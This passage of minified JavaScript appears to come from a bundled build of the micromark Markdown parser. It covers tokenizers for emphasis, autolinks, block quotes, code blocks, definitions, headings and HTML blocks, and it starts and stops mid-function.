l="";if(r===37&&Gt(a.charCodeAt(t+1))&&Gt(a.charCodeAt(t+2)))i=2;else if(r<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(r))||(l=String.fromCharCode(r));else if(r>55295&&r<57344){const u=a.charCodeAt(t+1);r<56320&&u>56319&&u<57344?(l=String.fromCharCode(r,u),i=1):l=""}else l=String.fromCharCode(r);l&&(e.push(a.slice(n,t),encodeURIComponent(l)),n=t+i+1,l=""),i&&(t+=i,i=0)}return e.join("")+a.slice(n)}function ba(a,e,t,n){const i=n?n-1:Number.POSITIVE_INFINITY;let r=0;return l;function l(d){return sa(d)?(a.enter(t),u(d)):e(d)}function u(d){return sa(d)&&r++<i?(a.consume(d),u):(a.exit(t),e(d))}}const cG={tokenize:uG};function uG(a){const e=a.attempt(this.parser.constructs.contentInitial,n,i);let t;return e;function n(u){if(u===null){a.consume(u);return}return a.enter("lineEnding"),a.consume(u),a.exit("lineEnding"),ba(a,e,"linePrefix")}function i(u){return a.enter("paragraph"),r(u)}function r(u){const d=a.enter("chunkText",{contentType:"text",previous:t});return t&&(t.next=d),t=d,l(u)}function l(u){if(u===null){a.exit("chunkText"),a.exit("paragraph"),a.consume(u);return}return ze(u)?(a.consume(u),a.exit("chunkText"),r):(a.consume(u),l)}}const dG={tokenize:pG},DP={tokenize:mG};function pG(a){const e=this,t=[];let n=0,i,r,l;return u;function u(k){if(n<t.length){const Y=t[n];return e.containerState=Y[1],a.attempt(Y[0].continuation,d,p)(k)}return p(k)}function d(k){if(n++,e.containerState._closeFlow){e.containerState._closeFlow=void 0,i&&w();const Y=e.events.length;let ee=Y,Q;for(;ee--;)if(e.events[ee][0]==="exit"&&e.events[ee][1].type==="chunkFlow"){Q=e.events[ee][1].end;break}I(n);let q=Y;for(;q<e.events.length;)e.events[q][1].end={...Q},q++;return Dn(e.events,ee+1,0,e.events.slice(Y)),e.events.length=q,p(k)}return u(k)}function p(k){if(n===t.length){if(!i)return E(k);if(i.currentConstruct&&i.currentConstruct.concrete)return A(k);e.interrupt=!!(i.currentConstruct&&!i._gfmTableDynamicInterruptHack)}return e.containerState={},a.check(DP,f,h)(k)}function f(k){return i&&w(),I(n),E(k)}function h(k){return e.parser.lazy[e.now().line]=n!==t.length,l=e.now().offset,A(k)}function E(k){return e.containerState={},a.attempt(DP,C,A)(k)}function C(k){return n++,t.push([e.currentConstruct,e.containerState]),E(k)}function A(k){if(k===null){i&&w(),I(0),a.consume(k);return}return i=i||e.parser.flow(e.now()),a.enter("chunkFlow",{_tokenizer:i,contentType:"flow",previous:r}),j(k)}function j(k){if(k===null){R(a.exit("chunkFlow"),!0),I(0),a.consume(k);return}return ze(k)?(a.consume(k),R(a.exit("chunkFlow")),n=0,e.interrupt=void 0,u):(a.consume(k),j)}function R(k,Y){const ee=e.sliceStream(k);if(Y&&ee.push(null),k.previous=r,r&&(r.next=k),r=k,i.defineSkip(k.start),i.write(ee),e.parser.lazy[k.start.line]){let Q=i.events.length;for(;Q--;)if(i.events[Q][1].start.offset<l&&(!i.events[Q][1].end||i.events[Q][1].end.offset>l))return;const q=e.events.length;let M=q,N,L;for(;M--;)if(e.events[M][0]==="exit"&&e.events[M][1].type==="chunkFlow"){if(N){L=e.events[M][1].end;break}N=!0}for(I(n),Q=q;Q<e.events.length;)e.events[Q][1].end={...L},Q++;Dn(e.events,M+1,0,e.events.slice(q)),e.events.length=Q}}function I(k){let Y=t.length;for(;Y-- >k;){const ee=t[Y];e.containerState=ee[1],ee[0].exit.call(e,a)}t.length=k}function w(){i.write([null]),r=void 0,i=void 0,e.containerState._closeFlow=void 0}}function mG(a,e,t){return ba(a,a.attempt(this.parser.constructs.document,e,t),"linePrefix",this.parser.constructs.disable.null.includes("codeIndented")?void 0:4)}function qc(a){if(a===null||Na(a)||ul(a))return 1;if(hg(a))return 2}function gg(a,e,t){const n=[];let i=-1;for(;++i<a.length;){const r=a[i].resolveAll;r&&!n.includes(r)&&(e=r(e,t),n.push(r))}return e}const L0={name:"attention",resolveAll:fG,tokenize:hG};function fG(a,e){let t=-1,n,i,r,l,u,d,p,f;for(;++t<a.length;)if(a[t][0]==="enter"&&a[t][1].type==="attentionSequence"&&a[t][1]._close){for(n=t;n--;)if(a[n][0]==="exit"&&a[n][1].type==="attentionSequence"&&a[n][1]._open&&e.sliceSerialize(a[n][1]).charCodeAt(0)===e.sliceSerialize(a[t][1]).charCodeAt(0)){if((a[n][1]._close||a[t][1]._open)&&(a[t][1].end.offset-a[t][1].start.offset)%3&&!((a[n][1].end.offset-a[n][1].start.offset+a[t][1].end.offset-a[t][1].start.offset)%3))continue;d=a[n][1].end.offset-a[n][1].start.offset>1&&a[t][1].end.offset-a[t][1].start.offset>1?2:1;const h={...a[n][1].end},E={...a[t][1].start};MP(h,-d),MP(E,d),l={type:d>1?"strongSequence":"emphasisSequence",start:h,end:{...a[n][1].end}},u={type:d>1?"strongSequence":"emphasisSequence",start:{...a[t][1].start},end:E},r={type:d>1?"strongText":"emphasisText",start:{...a[n][1].end},end:{...a[t][1].start}},i={type:d>1?"strong":"emphasis",start:{...l.start},end:{...u.end}},a[n][1].end={...l.start},a[t][1].start={...u.end},p=[],a[n][1].end.offset-a[n][1].start.offset&&(p=Wn(p,[["enter",a[n][1],e],["exit",a[n][1],e]])),p=Wn(p,[["enter",i,e],["enter",l,e],["exit",l,e],["enter",r,e]]),p=Wn(p,gg(e.parser.constructs.insideSpan.null,a.slice(n+1,t),e)),p=Wn(p,[["exit",r,e],["enter",u,e],["exit",u,e],["exit",i,e]]),a[t][1].end.offset-a[t][1].start.offset?(f=2,p=Wn(p,[["enter",a[t][1],e],["exit",a[t][1],e]])):f=0,Dn(a,n-1,t-n+3,p),t=n+p.length-f-2;break}}for(t=-1;++t<a.length;)a[t][1].type==="attentionSequence"&&(a[t][1].type="data");return a}function hG(a,e){const t=this.parser.constructs.attentionMarkers.null,n=this.previous,i=qc(n);let r;return l;function l(d){return r=d,a.enter("attentionSequence"),u(d)}function u(d){if(d===r)return a.consume(d),u;const p=a.exit("attentionSequence"),f=qc(d),h=!f||f===2&&i||t.includes(d),E=!i||i===2&&f||t.includes(n);return p._open=!!(r===42?h:h&&(i||!E)),p._close=!!(r===42?E:E&&(f||!h)),e(d)}}function MP(a,e){a.column+=e,a.offset+=e,a._bufferIndex+=e}const gG={name:"autolink",tokenize:bG};function bG(a,e,t){let n=0;return i;function i(C){return a.enter("autolink"),a.enter("autolinkMarker"),a.consume(C),a.exit("autolinkMarker"),a.enter("autolinkProtocol"),r}function r(C){return Xt(C)?(a.consume(C),l):C===64?t(C):p(C)}function l(C){return C===43||C===45||C===46||Gt(C)?(n=1,u(C)):p(C)}function u(C){return C===58?(a.consume(C),n=0,d):(C===43||C===45||C===46||Gt(C))&&n++<32?(a.consume(C),u):(n=0,p(C))}function d(C){return C===62?(a.exit("autolinkProtocol"),a.enter("autolinkMarker"),a.consume(C),a.exit("autolinkMarker"),a.exit("autolink"),e):C===null||C===32||C===60||wh(C)?t(C):(a.consume(C),d)}function p(C){return C===64?(a.consume(C),f):sG(C)?(a.consume(C),p):t(C)}function f(C){return Gt(C)?h(C):t(C)}function h(C){return C===46?(a.consume(C),n=0,f):C===62?(a.exit("autolinkProtocol").type="autolinkEmail",a.enter("autolinkMarker"),a.consume(C),a.exit("autolinkMarker"),a.exit("autolink"),e):E(C)}function E(C){if((C===45||Gt(C))&&n++<63){const A=C===45?E:h;return a.consume(C),A}return t(C)}}const _p={partial:!0,tokenize:vG};function vG(a,e,t){return n;function n(r){return sa(r)?ba(a,i,"linePrefix")(r):i(r)}function i(r){return r===null||ze(r)?e(r):t(r)}}const aM={continuation:{tokenize:EG},exit:SG,name:"blockQuote",tokenize:yG};function yG(a,e,t){const n=this;return i;function i(l){if(l===62){const u=n.containerState;return u.open||(a.enter("blockQuote",{_container:!0}),u.open=!0),a.enter("blockQuotePrefix"),a.enter("blockQuoteMarker"),a.consume(l),a.exit("blockQuoteMarker"),r}return t(l)}function r(l){return sa(l)?(a.enter("blockQuotePrefixWhitespace"),a.consume(l),a.exit("blockQuotePrefixWhitespace"),a.exit("blockQuotePrefix"),e):(a.exit("blockQuotePrefix"),e(l))}}function EG(a,e,t){const n=this;return i;function i(l){return sa(l)?ba(a,r,"linePrefix",n.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(l):r(l)}function r(l){return a.attempt(aM,e,t)(l)}}function SG(a){a.exit("blockQuote")}const tM={name:"characterEscape",tokenize:CG};function CG(a,e,t){return n;function n(r){return a.enter("characterEscape"),a.enter("escapeMarker"),a.consume(r),a.exit("escapeMarker"),i}function i(r){return lG(r)?(a.enter("characterEscapeValue"),a.consume(r),a.exit("characterEscapeValue"),a.exit("characterEscape"),e):t(r)}}const nM={name:"characterReference",tokenize:TG};function TG(a,e,t){const n=this;let i=0,r,l;return u;function u(h){return a.enter("characterReference"),a.enter("characterReferenceMarker"),a.consume(h),a.exit("characterReferenceMarker"),d}function d(h){return h===35?(a.enter("characterReferenceMarkerNumeric"),a.consume(h),a.exit("characterReferenceMarkerNumeric"),p):(a.enter("characterReferenceValue"),r=31,l=Gt,f(h))}function p(h){return h===88||h===120?(a.enter("characterReferenceMarkerHexadecimal"),a.consume(h),a.exit("characterReferenceMarkerHexadecimal"),a.enter("characterReferenceValue"),r=6,l=rG,f):(a.enter("characterReferenceValue"),r=7,l=P0,f(h))}function f(h){if(h===59&&i){const E=a.exit("characterReferenceValue");return l===Gt&&!B1(n.sliceSerialize(E))?t(h):(a.enter("characterReferenceMarker"),a.consume(h),a.exit("characterReferenceMarker"),a.exit("characterReference"),e)}return l(h)&&i++<r?(a.consume(h),f):t(h)}}const NP={partial:!0,tokenize:AG},_P={concrete:!0,name:"codeFenced",tokenize:xG};function xG(a,e,t){const n=this,i={partial:!0,tokenize:ee};let r=0,l=0,u;return d;function d(Q){return p(Q)}function p(Q){const q=n.events[n.events.length-1];return r=q&&q[1].type==="linePrefix"?q[2].sliceSerialize(q[1],!0).length:0,u=Q,a.enter("codeFenced"),a.enter("codeFencedFence"),a.enter("codeFencedFenceSequence"),f(Q)}function f(Q){return Q===u?(l++,a.consume(Q),f):l<3?t(Q):(a.exit("codeFencedFenceSequence"),sa(Q)?ba(a,h,"whitespace")(Q):h(Q))}function h(Q){return Q===null||ze(Q)?(a.exit("codeFencedFence"),n.interrupt?e(Q):a.check(NP,j,Y)(Q)):(a.enter("codeFencedFenceInfo"),a.enter("chunkString",{contentType:"string"}),E(Q))}function E(Q){return Q===null||ze(Q)?(a.exit("chunkString"),a.exit("codeFencedFenceInfo"),h(Q)):sa(Q)?(a.exit("chunkString"),a.exit("codeFencedFenceInfo"),ba(a,C,"whitespace")(Q)):Q===96&&Q===u?t(Q):(a.consume(Q),E)}function C(Q){return Q===null||ze(Q)?h(Q):(a.enter("codeFencedFenceMeta"),a.enter("chunkString",{contentType:"string"}),A(Q))}function A(Q){return Q===null||ze(Q)?(a.exit("chunkString"),a.exit("codeFencedFenceMeta"),h(Q)):Q===96&&Q===u?t(Q):(a.consume(Q),A)}function j(Q){return a.attempt(i,Y,R)(Q)}function R(Q){return a.enter("lineEnding"),a.consume(Q),a.exit("lineEnding"),I}function I(Q){return r>0&&sa(Q)?ba(a,w,"linePrefix",r+1)(Q):w(Q)}function w(Q){return Q===null||ze(Q)?a.check(NP,j,Y)(Q):(a.enter("codeFlowValue"),k(Q))}function k(Q){return Q===null||ze(Q)?(a.exit("codeFlowValue"),w(Q)):(a.consume(Q),k)}function Y(Q){return a.exit("codeFenced"),e(Q)}function ee(Q,q,M){let N=0;return L;function L(me){return Q.enter("lineEnding"),Q.consume(me),Q.exit("lineEnding"),_}function _(me){return Q.enter("codeFencedFence"),sa(me)?ba(Q,V,"linePrefix",n.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(me):V(me)}function V(me){return me===u?(Q.enter("codeFencedFenceSequence"),F(me)):M(me)}function F(me){return me===u?(N++,Q.consume(me),F):N>=l?(Q.exit("codeFencedFenceSequence"),sa(me)?ba(Q,ce,"whitespace")(me):ce(me)):M(me)}function ce(me){return me===null||ze(me)?(Q.exit("codeFencedFence"),q(me)):M(me)}}}function AG(a,e,t){const n=this;return i;function i(l){return l===null?t(l):(a.enter("lineEnding"),a.consume(l),a.exit("lineEnding"),r)}function r(l){return n.parser.lazy[n.now().line]?t(l):e(l)}}const oy={name:"codeIndented",tokenize:LG},PG={partial:!0,tokenize:RG};function LG(a,e,t){const n=this;return i;function i(p){return a.enter("codeIndented"),ba(a,r,"linePrefix",5)(p)}function r(p){const f=n.events[n.events.length-1];return f&&f[1].type==="linePrefix"&&f[2].sliceSerialize(f[1],!0).length>=4?l(p):t(p)}function l(p){return p===null?d(p):ze(p)?a.attempt(PG,l,d)(p):(a.enter("codeFlowValue"),u(p))}function u(p){return p===null||ze(p)?(a.exit("codeFlowValue"),l(p)):(a.consume(p),u)}function d(p){return a.exit("codeIndented"),e(p)}}function RG(a,e,t){const n=this;return i;function i(l){return n.parser.lazy[n.now().line]?t(l):ze(l)?(a.enter("lineEnding"),a.consume(l),a.exit("lineEnding"),i):ba(a,r,"linePrefix",5)(l)}function r(l){const u=n.events[n.events.length-1];return u&&u[1].type==="linePrefix"&&u[2].sliceSerialize(u[1],!0).length>=4?e(l):ze(l)?i(l):t(l)}}const IG={name:"codeText",previous:jG,resolve:wG,tokenize:DG};function wG(a){let e=a.length-4,t=3,n,i;if((a[t][1].type==="lineEnding"||a[t][1].type==="space")&&(a[e][1].type==="lineEnding"||a[e][1].type==="space")){for(n=t;++n<e;)if(a[n][1].type==="codeTextData"){a[t][1].type="codeTextPadding",a[e][1].type="codeTextPadding",t+=2,e-=2;break}}for(n=t-1,e++;++n<=e;)i===void 0?n!==e&&a[n][1].type!=="lineEnding"&&(i=n):(n===e||a[n][1].type==="lineEnding")&&(a[i][1].type="codeTextData",n!==i+2&&(a[i][1].end=a[n-1][1].end,a.splice(i+2,n-i-2),e-=n-i-2,n=i+2),i=void 0);return a}function jG(a){return a!==96||this.events[this.events.length-1][1].type==="characterEscape"}function DG(a,e,t){let n=0,i,r;return l;function l(h){return a.enter("codeText"),a.enter("codeTextSequence"),u(h)}function u(h){return h===96?(a.consume(h),n++,u):(a.exit("codeTextSequence"),d(h))}function d(h){return h===null?t(h):h===32?(a.enter("space"),a.consume(h),a.exit("space"),d):h===96?(r=a.enter("codeTextSequence"),i=0,f(h)):ze(h)?(a.enter("lineEnding"),a.consume(h),a.exit("lineEnding"),d):(a.enter("codeTextData"),p(h))}function p(h){return h===null||h===32||h===96||ze(h)?(a.exit("codeTextData"),d(h)):(a.consume(h),p)}function f(h){return h===96?(a.consume(h),i++,f):i===n?(a.exit("codeTextSequence"),a.exit("codeText"),e(h)):(r.type="codeTextData",p(h))}}class MG{constructor(e){this.left=e?[...e]:[],this.right=[]}get(e){if(e<0||e>=this.left.length+this.right.length)throw new RangeError("Cannot access index `"+e+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return e<this.left.length?this.left[e]:this.right[this.right.length-e+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(e,t){const n=t??Number.POSITIVE_INFINITY;return n<this.left.length?this.left.slice(e,n):e>this.left.length?this.right.slice(this.right.length-n+this.left.length,this.right.length-e+this.left.length).reverse():this.left.slice(e).concat(this.right.slice(this.right.length-n+this.left.length).reverse())}splice(e,t,n){const i=t||0;this.setCursor(Math.trunc(e));const r=this.right.splice(this.right.length-i,Number.POSITIVE_INFINITY);return n&&dd(this.left,n),r.reverse()}pop(){return this.setCursor(Number.POSITIVE_INFINITY),this.left.pop()}push(e){this.setCursor(Number.POSITIVE_INFINITY),this.left.push(e)}pushMany(e){this.setCursor(Number.POSITIVE_INFINITY),dd(this.left,e)}unshift(e){this.setCursor(0),this.right.push(e)}unshiftMany(e){this.setCursor(0),dd(this.right,e.reverse())}setCursor(e){if(!(e===this.left.length||e>this.left.length&&this.right.length===0||e<0&&this.left.length===0))if(e<this.left.length){const t=this.left.splice(e,Number.POSITIVE_INFINITY);dd(this.right,t.reverse())}else{const t=this.right.splice(this.left.length+this.right.length-e,Number.POSITIVE_INFINITY);dd(this.left,t.reverse())}}}function dd(a,e){let t=0;if(e.length<1e4)a.push(...e);else for(;t<e.length;)a.push(...e.slice(t,t+1e4)),t+=1e4}function iM(a){const e={};let t=-1,n,i,r,l,u,d,p;const f=new MG(a);for(;++t<f.length;){for(;t in e;)t=e[t];if(n=f.get(t),t&&n[1].type==="chunkFlow"&&f.get(t-1)[1].type==="listItemPrefix"&&(d=n[1]._tokenizer.events,r=0,r<d.length&&d[r][1].type==="lineEndingBlank"&&(r+=2),r<d.length&&d[r][1].type==="content"))for(;++r<d.length&&d[r][1].type!=="content";)d[r][1].type==="chunkText"&&(d[r][1]._isInFirstContentOfListItem=!0,r++);if(n[0]==="enter")n[1].contentType&&(Object.assign(e,NG(f,t)),t=e[t],p=!0);else if(n[1]._container){for(r=t,i=void 0;r--;)if(l=f.get(r),l[1].type==="lineEnding"||l[1].type==="lineEndingBlank")l[0]==="enter"&&(i&&(f.get(i)[1].type="lineEndingBlank"),l[1].type="lineEnding",i=r);else if(!(l[1].type==="linePrefix"||l[1].type==="listItemIndent"))break;i&&(n[1].end={...f.get(i)[1].start},u=f.slice(i,t),u.unshift(n),f.splice(i,t-i+1,u))}}return Dn(a,0,Number.POSITIVE_INFINITY,f.slice(0)),!p}function NG(a,e){const t=a.get(e)[1],n=a.get(e)[2];let i=e-1;const r=[];let l=t._tokenizer;l||(l=n.parser[t.contentType](t.start),t._contentTypeTextTrailing&&(l._contentTypeTextTrailing=!0));const u=l.events,d=[],p={};let f,h,E=-1,C=t,A=0,j=0;const R=[j];for(;C;){for(;a.get(++i)[1]!==C;);r.push(i),C._tokenizer||(f=n.sliceStream(C),C.next||f.push(null),h&&l.defineSkip(C.start),C._isInFirstContentOfListItem&&(l._gfmTasklistFirstContentOfListItem=!0),l.write(f),C._isInFirstContentOfListItem&&(l._gfmTasklistFirstContentOfListItem=void 0)),h=C,C=C.next}for(C=t;++E<u.length;)u[E][0]==="exit"&&u[E-1][0]==="enter"&&u[E][1].type===u[E-1][1].type&&u[E][1].start.line!==u[E][1].end.line&&(j=E+1,R.push(j),C._tokenizer=void 0,C.previous=void 0,C=C.next);for(l.events=[],C?(C._tokenizer=void 0,C.previous=void 0):R.pop(),E=R.length;E--;){const I=u.slice(R[E],R[E+1]),w=r.pop();d.push([w,w+I.length-1]),a.splice(w,2,I)}for(d.reverse(),E=-1;++E<d.length;)p[A+d[E][0]]=A+d[E][1],A+=d[E][1]-d[E][0]-1;return p}const _G={resolve:kG,tokenize:OG},qG={partial:!0,tokenize:UG};function kG(a){return iM(a),a}function OG(a,e){let t;return n;function n(u){return a.enter("content"),t=a.enter("chunkContent",{contentType:"content"}),i(u)}function i(u){return u===null?r(u):ze(u)?a.check(qG,l,r)(u):(a.consume(u),i)}function r(u){return a.exit("chunkContent"),a.exit("content"),e(u)}function l(u){return a.consume(u),a.exit("chunkContent"),t.next=a.enter("chunkContent",{contentType:"content",previous:t}),t=t.next,i}}function UG(a,e,t){const n=this;return i;function i(l){return a.exit("chunkContent"),a.enter("lineEnding"),a.consume(l),a.exit("lineEnding"),ba(a,r,"linePrefix")}function r(l){if(l===null||ze(l))return t(l);const u=n.events[n.events.length-1];return!n.parser.constructs.disable.null.includes("codeIndented")&&u&&u[1].type==="linePrefix"&&u[2].sliceSerialize(u[1],!0).length>=4?e(l):a.interrupt(n.parser.constructs.flow,t,e)(l)}}function oM(a,e,t,n,i,r,l,u,d){const p=d||Number.POSITIVE_INFINITY;let f=0;return h;function h(I){return I===60?(a.enter(n),a.enter(i),a.enter(r),a.consume(I),a.exit(r),E):I===null||I===32||I===41||wh(I)?t(I):(a.enter(n),a.enter(l),a.enter(u),a.enter("chunkString",{contentType:"string"}),j(I))}function E(I){return I===62?(a.enter(r),a.consume(I),a.exit(r),a.exit(i),a.exit(n),e):(a.enter(u),a.enter("chunkString",{contentType:"string"}),C(I))}function C(I){return I===62?(a.exit("chunkString"),a.exit(u),E(I)):I===null||I===60||ze(I)?t(I):(a.consume(I),I===92?A:C)}function A(I){return I===60||I===62||I===92?(a.consume(I),C):C(I)}function j(I){return!f&&(I===null||I===41||Na(I))?(a.exit("chunkString"),a.exit(u),a.exit(l),a.exit(n),e(I)):f<p&&I===40?(a.consume(I),f++,j):I===41?(a.consume(I),f--,j):I===null||I===32||I===40||wh(I)?t(I):(a.consume(I),I===92?R:j)}function R(I){return I===40||I===41||I===92?(a.consume(I),j):j(I)}}function sM(a,e,t,n,i,r){const l=this;let u=0,d;return p;function p(C){return a.enter(n),a.enter(i),a.consume(C),a.exit(i),a.enter(r),f}function f(C){return u>999||C===null||C===91||C===93&&!d||C===94&&!u&&"_hiddenFootnoteSupport"in l.parser.constructs?t(C):C===93?(a.exit(r),a.enter(i),a.consume(C),a.exit(i),a.exit(n),e):ze(C)?(a.enter("lineEnding"),a.consume(C),a.exit("lineEnding"),f):(a.enter("chunkString",{contentType:"string"}),h(C))}function h(C){return C===null||C===91||C===93||ze(C)||u++>999?(a.exit("chunkString"),f(C)):(a.consume(C),d||(d=!sa(C)),C===92?E:h)}function E(C){return C===91||C===92||C===93?(a.consume(C),u++,h):h(C)}}function rM(a,e,t,n,i,r){let l;return u;function u(E){return E===34||E===39||E===40?(a.enter(n),a.enter(i),a.consume(E),a.exit(i),l=E===40?41:E,d):t(E)}function d(E){return E===l?(a.enter(i),a.consume(E),a.exit(i),a.exit(n),e):(a.enter(r),p(E))}function p(E){return E===l?(a.exit(r),d(l)):E===null?t(E):ze(E)?(a.enter("lineEnding"),a.consume(E),a.exit("lineEnding"),ba(a,p,"linePrefix")):(a.enter("chunkString",{contentType:"string"}),f(E))}function f(E){return E===l||E===null||ze(E)?(a.exit("chunkString"),p(E)):(a.consume(E),E===92?h:f)}function h(E){return E===l||E===92?(a.consume(E),f):f(E)}}function kd(a,e){let t;return n;function n(i){return ze(i)?(a.enter("lineEnding"),a.consume(i),a.exit("lineEnding"),t=!0,n):sa(i)?ba(a,n,t?"linePrefix":"lineSuffix")(i):e(i)}}const zG={name:"definition",tokenize:FG},BG={partial:!0,tokenize:VG};function FG(a,e,t){const n=this;let i;return r;function r(C){return a.enter("definition"),l(C)}function l(C){return sM.call(n,a,u,t,"definitionLabel","definitionLabelMarker","definitionLabelString")(C)}function u(C){return i=Ci(n.sliceSerialize(n.events[n.events.length-1][1]).slice(1,-1)),C===58?(a.enter("definitionMarker"),a.consume(C),a.exit("definitionMarker"),d):t(C)}function d(C){return Na(C)?kd(a,p)(C):p(C)}function p(C){return oM(a,f,t,"definitionDestination","definitionDestinationLiteral","definitionDestinationLiteralMarker","definitionDestinationRaw","definitionDestinationString")(C)}function f(C){return a.attempt(BG,h,h)(C)}function h(C){return sa(C)?ba(a,E,"whitespace")(C):E(C)}function E(C){return C===null||ze(C)?(a.exit("definition"),n.parser.defined.push(i),e(C)):t(C)}}function VG(a,e,t){return n;function n(u){return Na(u)?kd(a,i)(u):t(u)}function i(u){return rM(a,r,t,"definitionTitle","definitionTitleMarker","definitionTitleString")(u)}function r(u){return sa(u)?ba(a,l,"whitespace")(u):l(u)}function l(u){return u===null||ze(u)?e(u):t(u)}}const HG={name:"hardBreakEscape",tokenize:GG};function GG(a,e,t){return n;function n(r){return a.enter("hardBreakEscape"),a.consume(r),i}function i(r){return ze(r)?(a.exit("hardBreakEscape"),e(r)):t(r)}}const QG={name:"headingAtx",resolve:JG,tokenize:WG};function JG(a,e){let t=a.length-2,n=3,i,r;return a[n][1].type==="whitespace"&&(n+=2),t-2>n&&a[t][1].type==="whitespace"&&(t-=2),a[t][1].type==="atxHeadingSequence"&&(n===t-1||t-4>n&&a[t-2][1].type==="whitespace")&&(t-=n+1===t?2:4),t>n&&(i={type:"atxHeadingText",start:a[n][1].start,end:a[t][1].end},r={type:"chunkText",start:a[n][1].start,end:a[t][1].end,contentType:"text"},Dn(a,n,t-n+1,[["enter",i,e],["enter",r,e],["exit",r,e],["exit",i,e]])),a}function WG(a,e,t){let n=0;return i;function i(f){return a.enter("atxHeading"),r(f)}function r(f){return a.enter("atxHeadingSequence"),l(f)}function l(f){return f===35&&n++<6?(a.consume(f),l):f===null||Na(f)?(a.exit("atxHeadingSequence"),u(f)):t(f)}function u(f){return f===35?(a.enter("atxHeadingSequence"),d(f)):f===null||ze(f)?(a.exit("atxHeading"),e(f)):sa(f)?ba(a,u,"whitespace")(f):(a.enter("atxHeadingText"),p(f))}function d(f){return f===35?(a.consume(f),d):(a.exit("atxHeadingSequence"),u(f))}function p(f){return f===null||f===35||Na(f)?(a.exit("atxHeadingText"),u(f)):(a.consume(f),p)}}const KG=["address","article","aside","base","basefont","blockquote","body","caption","center","col","colgroup","dd","details","dialog","dir","div","dl","dt","fieldset","figcaption","figure","footer","form","frame","frameset","h1","h2","h3","h4","h5","h6","head","header","hr","html","iframe","legend","li","link","main","menu","menuitem","nav","noframes","ol","optgroup","option","p","param","search","section","summary","table","tbody","td","tfoot","th","thead","title","tr","track","ul"],qP=["pre","script","style","textarea"],YG={concrete:!0,name:"htmlFlow",resolveTo:ZG,tokenize:eQ},$G={partial:!0,tokenize:tQ},XG={partial:!0,tokenize:aQ};function ZG(a){let e=a.length;for(;e--&&!(a[e][0]==="enter"&&a[e][1].type==="htmlFlow"););return e>1&&a[e-2][1].type==="linePrefix"&&(a[e][1].start=a[e-2][1].start,a[e+1][1].start=a[e-2][1].start,a.splice(e-2,2)),a}function eQ(a,e,t){const n=this;let i,r,l,u,d;return p;function p(B){return f(B)}function f(B){return a.enter("htmlFlow"),a.enter("htmlFlowData"),a.consume(B),h}function h(B){return B===33?(a.consume(B),E):B===47?(a.consume(B),r=!0,j):B===63?(a.consume(B),i=3,n.interrupt?e:G):Xt(B)?(a.consume(B),l=String.fromCharCode(B),R):t(B)}function E(B){return B===45?(a.consume(B),i=2,C):B===91?(a.consume(B),i=5,u=0,A):Xt(B)?(a.consume(B),i=4,n.interrupt?e:G):t(B)}function C(B){return B===45?(a.consume(B),n.interrupt?e:G):t(B)}function A(B){const Re="CDATA[";return B===Re.charCodeAt(u++)?(a.consume(B),u===Re.length?n.interrupt?e:V:A):t(B)}function j(B){return Xt(B)?(a.consume(B),l=String.fromCharCode(B),R):t(B)}function R(B){if(B===null||B===47||B===62||Na(B)){const Re=B===47,Oe=l.toLowerCase();return!Re&&!r&&qP.includes(Oe)?(i=1,n.interrupt?e(B):V(B)):KG.includes(l.toLowerCase())?(i=6,Re?(a.consume(B),I):n.interrupt?e(B):V(B)):(i=7,n.interrupt&&!n.parser.lazy[n.now().line]?t(B):r?w(B):k(B))}return B===45||Gt(B)?(a.consume(B),l+=String.fromCharCode(B),R):t(B)}function I(B){return B===62?(a.consume(B),n.interrupt?e:V):t(B)}function w(B){return sa(B)?(a.consume(B),w):L(B)}function k(B){return B===47?(a.consume(B),L):B===58||B===95||Xt(B)?(a.consume(B),Y):sa(B)?(a.consume(B),k):L(B)}function Y(B){return B===45||B===46||B===58||B===95||Gt(B)?(a.consume(B),Y):ee(B)}function ee(B){return B===61?(a.consume(B),Q):sa(B)?(a.consume(B),ee):k(B)}function Q(B){return B===null||B===60||B===61||B===62||B===96?t(B):B===34||B===39?(a.consume(B),d=B,q):sa(B)?(a.consume(B),Q):M(B)}function q(B){return B===d?(a.consume(B),d=null,N):B===null||ze(B)?t(B):(a.consume(B),q)}function M(B){return B===null||B===34||B===39||B===47||B===60||B===61||B===62||B===96||Na(B)?ee(B):(a.consume(B),M)}function N(B){return B===47||B===62||sa(B)?k(B):t(B)}function L(B){return B===62?(a.consume(B),_):t(B)}function _(B){return B===null||ze(B)?V(B):sa(B)?(a.consume(B),_):t(B)}function V(B){return B===45&&i===2?(a.consume(B),Z):B===60&&i===1?(a.consume(B),re):B===62&&i===4?(a.consume(B),J):B===63&&i===3?(a.consume(B),G):B===93&&i===5?(a.consume(B),je):ze(B)&&(i===6||i===7)?(a.exit("htmlFlowData"),a.check($G,de,F)(B)):B===null||ze(B)?(a.exit("htmlFlowData"),F(B)):(a.consume(B),V)}function F(B){return a.check(XG,ce,de)(B)}function ce(B){return a.enter("lineEnding"),a.consume(B),a.exit("lineEnding"),me}function me(B){return B===null||ze(B)?F(B):(a.enter("htmlFlowData"),V(B))}function Z(B){return B===45?(a.consume(B),G):V(B)}function re(B){return B===47?(a.consume(B),l="",Ee):V(B)}function Ee(B){if(B===62){const Re=l.toLowerCase();return qP.includes(Re)?(a.consume(B),J):V(B)}return Xt(B)&&l.length<8?(a.consume(B),l+=String.fromCharCode(B),Ee):V(B)}function je(B){return B===93?(a.consume(B),G):V(B)}function G(B){return B===62?(a.consume(B),J):B===45&&i===2?(a.consume(B),G):V(B)}function J(B){return B===null||ze(B)?(a.exit("htmlFlowData"),de(B)):(a.consume(B),J)}function de(B){return a.exit("htmlFlow"),e(B)}}function aQ(a,e,t){const n=this;return i;function i(l){return ze(l)?(a.enter("lineEnding"),a.consume(l),a.exit("lineEnding"),r):t(l)}function r(l){return n.parser.lazy[n.now().line]?t(l):e(l)}}function tQ(a,e,t){return n;function n(i){return a.enter("lineEnding"),a.consume(i),a.exit("lineEnding"),a.attempt(_p,e,t)}}const nQ={name:"htmlText",tokenize:iQ};function iQ(a,e,t){const n=this;let i,r,l;return u;function u(G){return a.enter("htmlText"),a.enter("htmlTextData"),a.consume(G),d}function d(G){return G===33?(a.consume(G),p):G===47?(a.consume(G),ee):G===63?(a.consume(G),k):Xt(G)?(a.consume(G),M):t(G)}function p(G){return 